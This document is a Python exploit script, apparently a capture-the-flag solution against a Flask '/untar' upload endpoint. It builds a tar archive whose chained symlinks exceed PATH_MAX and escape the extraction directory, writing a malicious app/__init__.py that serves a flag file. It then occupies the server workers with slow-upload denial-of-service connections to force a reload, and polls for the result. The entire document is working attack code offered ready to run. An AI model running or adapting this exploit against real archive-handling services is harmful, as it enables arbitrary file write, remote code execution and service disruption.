#!/usr/bin/env python3
from __future__ import annotations

import argparse
import bz2
import io
import os
import socket
import tarfile
import threading
import time
from urllib.parse import urlparse

import requests

# Minimal working PATH_MAX-style shape that still exceeds 4096 once the
# final long-link component is resolved, but stays small enough after bzip2.
STEPS = 'abcdefghijklmno'  # 15 steps
DEST_DIR_LEN = len('/app/uploads/' + 'u'*32 + '/' + 'v'*32 + '/')
COMPONENT_LEN = (4096 - DEST_DIR_LEN) // (len(STEPS) + 1)
COMPONENT = 'd' * COMPONENT_LEN

# Keep payload short; only need one route after fresh import.
PAYLOAD = (
    b"from flask import Flask\n"
    b"from glob import glob as g\n"
    b"app=Flask(__name__)\n"
    b"@app.get('/')\n"
    b"def f():return open(g('/flag-*')[0]).read()\n"
)


def add_dir(tar: tarfile.TarFile, name: str, mode: int = 0o755) -> None:
    ti = tarfile.TarInfo(name)
    ti.type = tarfile.DIRTYPE
    ti.mode = mode
    tar.addfile(ti)


def add_symlink(tar: tarfile.TarFile, name: str, linkname: str) -> None:
    ti = tarfile.TarInfo(name)
    ti.type = tarfile.SYMTYPE
    ti.linkname = linkname
    tar.addfile(ti)


def add_file(tar: tarfile.TarFile, name: str, data: bytes, mode: int = 0o644) -> None:
    ti = tarfile.TarInfo(name)
    ti.type = tarfile.REGTYPE
    ti.size = len(data)
    ti.mode = mode
    tar.addfile(ti, io.BytesIO(data))


def build_archive() -> bytes:
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode='w') as tar:
        path = ''
        short = ''
        for step in STEPS:
            dir_path = os.path.join(path, COMPONENT) if path else COMPONENT
            add_dir(tar, dir_path)
            sym_path = os.path.join(path, step) if path else step
            add_symlink(tar, sym_path, COMPONENT)
            path = dir_path
            short = os.path.join(short, step) if short else step

        long_link = 'l' * 254
        pivot = os.path.join(short, long_link)
        # This symlink lives inside the deep resolved path and walks back to the
        # extraction root.
        add_symlink(tar, pivot, os.path.join(*['..'] * len(STEPS)))

        # Extraction root is /app/uploads/<user>/<upload>. Going up 3 levels
        # lands at /app, so escape/app/__init__.py becomes /app/app/__init__.py.
        add_symlink(tar, 'escape', os.path.join(pivot, *['..'] * 3))
        add_file(tar, 'escape/app/__init__.py', PAYLOAD)

    return bz2.compress(raw.getvalue(), compresslevel=9)


def multipart(blob: bytes) -> tuple[bytes, dict[str, str]]:
    # Minimal multipart overhead: exactly what Flask/Werkzeug needs for request.files.
    body = (
        b'--a\r\n'
        b'Content-Disposition: form-data; name="file"; filename="x.tar"\r\n\r\n'
        + blob +
        b'\r\n--a--\r\n'
    )
    return body, {'Content-Type': 'multipart/form-data; boundary=a'}


def post_tar(base: str, blob: bytes, timeout: float = 12.0) -> requests.Response:
    body, headers = multipart(blob)
    print(f'[*] archive={len(blob)} bytes multipart={len(body)} bytes')
    return requests.post(base.rstrip('/') + '/untar', data=body, headers=headers, timeout=timeout)


def slow_upload_once(base: str, hold: int, interval: float) -> None:
    u = urlparse(base)
    host = u.hostname or '127.0.0.1'
    port = u.port or (443 if u.scheme == 'https' else 80)
    if u.scheme != 'http':
        print('[!] slow-upload helper only supports plain http endpoints')
        return

    s = None
    try:
        s = socket.create_connection((host, port), timeout=5)
        req = (
            f'POST /untar HTTP/1.1\r\n'
            f'Host: {host}\r\n'
            f'Content-Type: multipart/form-data; boundary=a\r\n'
            f'Content-Length: 100000000\r\n'
            f'Connection: keep-alive\r\n\r\n'
            f'--a\r\nContent-Disposition: form-data; name="file"; filename="x.tar"\r\n\r\n'
        ).encode()
        s.sendall(req)
        end = time.time() + hold
        while time.time() < end:
            s.sendall(b'Z')
            time.sleep(interval)
    except Exception:
        pass
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def restart_workers(base: str, workers: int, hold: int, interval: float) -> None:
    print(f'[*] occupying {workers} workers with slow uploads for {hold}s')
    threads = []
    for _ in range(workers):
        t = threading.Thread(target=slow_upload_once, args=(base, hold, interval), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.15)
    for t in threads:
        t.join(timeout=hold + 2)


def poll(base: str, attempts: int = 90) -> str | None:
    sess = requests.Session()
    for i in range(attempts):
        try:
            r = sess.get(base.rstrip('/') + '/', timeout=4)
            text = r.text.strip()
            if r.status_code == 200 and '{' in text and '}' in text:
                print(f'[+] / -> {text}')
                return text
            if i % 10 == 0:
                print(f'[*] /: HTTP {r.status_code} {text[:80]!r}')
        except Exception as e:
            if i % 10 == 0:
                print(f'[*] poll error: {e}')
        time.sleep(1)
    return None


def main() -> int:
    ap = argparse.ArgumentParser(description='Exploit The Real TARget with size-optimized archive')
    ap.add_argument('url')
    ap.add_argument('--workers', type=int, default=4)
    ap.add_argument('--hold', type=int, default=45)
    ap.add_argument('--interval', type=float, default=5.0)
    args = ap.parse_args()

    blob = build_archive()
    r = post_tar(args.url, blob)
    print(f'[*] upload result: HTTP {r.status_code} {r.text[:200]!r}')
    if r.status_code != 200:
        print('[!] archive write did not succeed; if this is 500, the instance is likely patched or the bug is unavailable.')
        return 1

    restart_workers(args.url, args.workers, args.hold, args.interval)
    flag = poll(args.url)
    if flag:
        print(flag)
        return 0
    print('[-] upload succeeded, but no restarted worker served the payload yet. Retry with --workers 6 --hold 60.')
    return 1


if __name__ == '__main__':
    raise SystemExit(main())
